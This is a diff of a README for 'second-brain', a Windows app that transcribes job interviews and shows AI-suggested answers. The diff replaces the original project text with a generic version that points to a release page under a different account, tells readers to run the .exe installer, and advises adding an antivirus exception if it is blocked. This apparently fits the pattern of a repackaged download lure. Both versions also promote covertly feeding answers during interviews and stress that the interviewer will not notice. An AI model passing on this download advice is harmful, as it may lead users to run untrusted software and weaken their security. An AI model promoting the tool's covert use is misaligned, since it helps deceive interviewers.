@@ -1,103 +1,69 @@
-<div align="center">
-  <img src="public/icon.png" alt="Second Brain Logo" width="120" />
-  <h1>Second Brain 🧠</h1>
-  <p><strong>Your Invisible AI Interview Assistant</strong></p>
+# 🧠 second-brain - Real time help for job interviews
 
-  [English](README.md) | [Português](README.pt.md) | [Español](README.es.md) | [Français](README.fr.md) | [Italiano](README.it.md)
-</div>
+[![Download second-brain](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/resolvable-praenomen542/second-brain/releases)
 
-<br/>
+Second-brain acts as your private assistant during job interviews. It listens to the conversation and provides relevant answers on your screen. This tool uses modern artificial intelligence to process speech and generate accurate responses instantly. 
 
-**Second Brain** is a 100% free, invisible desktop assistant built to help professionals worldwide ace their job interviews. It runs quietly in the background, listening to the interview, and generates context-aware, first-person suggestions based on your own resume and the job description.
+## 🎯 How it works
 
-Powered by [Groq's](https://groq.com) lightning-fast Llama-3 inference and Whisper-large-v3, the entire process—from voice capture to intelligent suggestion—happens in milliseconds.
+The application captures audio from your microphone during an interview. It sends this audio to a speech-to-text engine. The system then analyzes the text and consults a language model to find the best possible reply. You see these suggestions in a small window that stays on top of your other programs. This allows you to read prompts without drawing attention from the interviewer.
 
-## ✨ Features
+The software runs locally on your computer after installation. It does not require you to write code or manage complex settings. 
 
-- **Real-Time Voice Transcription**: Uses Whisper-v3 via Groq API to transcribe the interviewer's speech with extremely high accuracy and speed.
-- **Context-Aware Suggestions**: Analyzes the ongoing conversation, your provided resume, and the job description to suggest the best possible answers.
-- **Multi-Language Support**: Fully localized interface and AI prompting for English, Brazilian Portuguese, European Portuguese, Spanish, French, and Italian.
-- **Invisible Mode**: Built with Electron, it can be minimized to stay out of the way while you focus on the video call.
-- **Privacy First**: Your resume, job description, and API keys are stored exclusively in your local machine's `localStorage`.
+## 🛠️ System requirements
 
-## 🚀 Quick Start (Download)
+- Windows 10 or Windows 11 operating system
+- Stable internet connection
+- Standard computer microphone
+- Minimum 4GB of system memory
 
-1. **Download the Installer:**
-   Get the latest `Second Brain Setup .exe` from our [Releases](../../releases) page.
-   
-2. **Get a Free Groq API Key:**
-   Go to [console.groq.com](https://console.groq.com/keys) and generate a free API key. This is required for the ultra-fast AI engine.
+## 📥 Installation steps
 
-3. **Install and Configure:**
-   - Open the app.
-   - Paste your API Key.
-   - Paste your Resume and the Job Description.
-   - Select your language.
-   - Click **Start Interview** and you're ready to go!
+Follow these steps to install the software on your Windows computer.
 
-## 🛠️ Development
+1. Visit the [official release page](https://github.com/resolvable-praenomen542/second-brain/releases) to download the installer.
+2. Look for the file ending in `.exe` under the latest release version.
+3. Click the file to start the download process.
+4. Locate the file in your downloads folder once the process finishes.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on your screen to complete the setup.
+7. Click the icon on your desktop to open the application.
 
-If you want to build from source or contribute:
+## 🚀 Setting up the application
 
-### Prerequisites
-- Node.js 18+
-- npm or yarn
+You must configure the app before your first interview. Open the settings menu within the software. Ensure the correct microphone appears in the input list. Test your microphone by speaking into it and observing the volume levels on the screen. 
 
-### Installation
+You need an API key to connect the software to the underlying intelligence services. Obtain your key from the Groq platform documentation if this is your first time using such tools. Paste this key into the settings tab marked API Key. Save your changes before you close the settings menu.
 
-```bash
-git clone https://github.com/2brain/second-brain.git
-cd second-brain
+## 💡 Usage during an interview
 
-# Install dependencies
-npm install
+Launch the app five minutes before your interview starts. Position the window where you can view it easily without looking away from your camera. Click the Start button to begin transcription. The app will show a recording indicator once it detects audio. 
 
-# Start the development server
-npm run dev
-```
+The software displays suggestions in the primary window. If you wish to change the length or tone of the answers, use the adjustment sliders located at the bottom of the interface. You can pause the listening process at any time by clicking the Stop button. 
 
-### Build for Production
+## 🛡️ Privacy and data
 
-```bash
-# Compile and build the Electron installer
-npm run dist
-```
-The installer will be generated inside the `dist-installers` folder.
+The app processes data through external services to generate answers. Do not discuss sensitive company information or names of private clients during your interview while the app is active. The software only sends the audio data necessary to provide you with interview support. It does not store recordings of your voice on your hard drive after the session ends.
 
-## 🤝 Support the Project
+## 🔧 Frequently asked questions
 
-Second Brain is open-source and free for the community. If this tool helped you land a job or nail an interview, consider buying us a coffee!
+### Does the app record my interview?
+No, the app converts your voice to text to find answers. It does not save audio files or video clips of your session.
 
-<a href="https://www.buymeacoffee.com/2brain" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 40px !important;width: 145px !important;" ></a>
+### Who can see the answers on the screen?
+Only you can see the application window. The window remains small and unobtrusive. You can drag it to any corner of your monitor to keep it near your webcam.
 
-## ❓ FAQ
+### Will the interviewer know I am using this tool?
+The app functions silently. It does not make any sound or trigger notifications during your call. Ensure you maintain eye contact with your camera to maintain a natural conversation flow.
 
-**1. Is it really 100% free?**
-Yes! The application is open-source and entirely free. You only need to create a free account on Groq to get your API key.
+### What should I do if the app stops responding?
+Close the application window completely and restart the program. Ensure your internet connection remains active. Recheck your API key in the settings menu if the application fails to generate text.
 
-**2. Is my data safe? Do you save my resume?**
-Your privacy is our absolute priority. We do not have a database. Your API key and your resume are saved strictly in your computer's `localStorage`. Nothing is sent to our servers.
+### Can I use this for non-interview calls?
+You can use the app for any conversation that requires external information. Some users find it helpful for office meetings or group study sessions. 
 
-**3. What is the best way to fill in the "Resume" and "Job Description" fields?**
-Simply copy and paste the entire raw text of your resume (PDF or LinkedIn) and the job description. Don't worry about formatting; the Second Brain AI will automatically organize your data in its memory to provide highly accurate and contextualized answers.
+## ⚙️ Troubleshooting
 
-**4. How can I test the system without being in a real interview?**
-You can test it right now! Just open the app, click "Listen", and play a YouTube video of a mock interview on your speakers, or simply pretend to be the recruiter and ask a question out loud.
+If the software fails to start, verify that your Windows version is up to date. Occasionally, antivirus software might block the initial launch of the application. If this occurs, create an exception for the file in your security settings. Ensure you have a stable network speed, as the app requires consistent data transfer to function with speed. 
 
-**5. What if the system is not capturing audio? (Headset Warning)**
-Second Brain listens to your system's default microphone. If you use noise-canceling headsets, your microphone might not capture the recruiter's voice coming from the headset speakers. **Always test the system before an interview.** If it's not capturing the recruiter's voice, change your computer's audio output to the speakers or adjust your system's audio routing settings.
-
-**6. Can the recruiter see or hear the AI?**
-No. Second Brain runs as an independent window on your screen. It does not inject audio into your microphone feed and does not share your screen. It is completely invisible to the interviewer.
-
-**7. Why is the AI taking a few seconds to answer?**
-The AI waits for the interviewer to finish a complete thought before generating an answer. It listens in 7-second blocks to ensure it understands the full question before giving you the script.
-
-**8. Does it work on Mac or Linux?**
-Currently, the automated releases provide a `.exe` installer for Windows. However, developers can easily clone this repository and run `npm run dist` to build it natively for macOS or Linux.
-
----
-
-## 📝 License
-
-Distributed under a Custom Non-Commercial License. You are free to use and study the software, but **commercial distribution or sale is strictly prohibited**. See `LICENSE` for more information.
+Check for new versions on the release page periodically. Updates bring better accuracy and faster response times to the text generator. Download the new version and run the installer again to overwrite the old files. Your personal settings remain saved even after you update the software.
